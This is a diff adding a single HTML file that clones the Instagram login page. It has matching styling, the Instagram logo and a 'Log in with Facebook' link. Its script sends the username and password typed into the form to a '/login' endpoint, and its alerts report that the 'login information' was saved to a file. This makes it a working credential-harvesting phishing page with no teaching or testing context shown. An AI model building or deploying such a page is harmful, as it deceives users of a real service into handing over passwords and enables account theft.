@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <style>
+    /* Basic CSS styles for Instagram login page clone */
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #fafafa;
+    }
+    .login-container {
+      width: 350px;
+      padding: 20px;
+      background-color: white;
+      border: 1px solid #dbdbdb;
+      text-align: center;
+    }
+    .login-container img {
+      width: 175px;
+      margin: 20px 0;
+    }
+    .input-field {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background-color: #fafafa;
+    }
+    .login-btn {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      background-color: #3897f0;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .login-btn:disabled {
+      background-color: #b2dffc;
+    }
+    .divider {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      margin: 15px 0;
+    }
+    .divider::before, .divider::after {
+      content: '';
+      flex: 1;
+      border-bottom: 1px solid #dbdbdb;
+    }
+    .divider:not(:empty)::before {
+      margin-right: .25em;
+    }
+    .divider:not(:empty)::after {
+      margin-left: .25em;
+    }
+    .fb-login {
+      color: #385185;
+      font-weight: bold;
+      margin-top: 15px;
+    }
+    .signup-link {
+      margin-top: 15px;
+      font-size: 14px;
+    }
+    .signup-link a {
+      color: #3897f0;
+      font-weight: bold;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="Phone number, username, or email" class="input-field" required>
+      <input type="password" id="password" placeholder="Password" class="input-field" required>
+      <button type="submit" class="login-btn">Log In</button>
+    </form>
+    <div class="divider">OR</div>
+    <a href="#" class="fb-login">Log in with Facebook</a>
+    <p class="signup-link">Don't have an account? <a href="#">Sign up</a></p>
+  </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", async function(event) {
+      event.preventDefault();
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      try {
+        const response = await fetch("/login", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ username, password })
+        });
+
+        if (response.ok) {
+          alert("Login information saved to file!");
+        } else {
+          alert("Failed to save login information.");
+        }
+      } catch (error) {
+        console.error("Error:", error);
+        alert("An error occurred while saving the login information.");
+      }
+    });
+  </script>
+</body>
+</html>
